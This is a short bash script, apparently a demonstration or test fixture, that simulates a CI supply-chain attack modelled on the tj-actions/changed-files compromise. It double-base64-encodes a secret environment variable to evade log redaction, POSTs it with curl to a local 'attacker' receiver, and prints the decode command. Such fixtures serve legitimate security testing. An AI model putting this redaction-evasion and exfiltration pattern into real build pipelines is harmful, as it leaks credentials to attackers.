#!/usr/bin/env bash
set -euo pipefail

echo "Running simulated third-party dependency scanner..."

# Double encode secret so that it's not redacted in the build logs.
# This is similar to  what `tj-actions/changed-files`compromise did.
encoded_secret="$(printf '%s' "$MYSECRET" | base64 -w0 | base64 -w0)"

echo "[LOG] Encoded secret: ${encoded_secret}"

# Simulate an attacker's HTTP exfiltration channel.
receiver="http://127.0.0.1:8765/collect"

echo "[LOG] Simulating HTTP exfiltration to ${receiver}"

curl --fail --silent --show-error \
    --max-time 5 \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "data=${encoded_secret}" \
    "$receiver"

echo "A receiver can reverse the Base64 encoding with:"
echo "printf '%s' '<encoded-value>' | base64 -d | base64 -d"
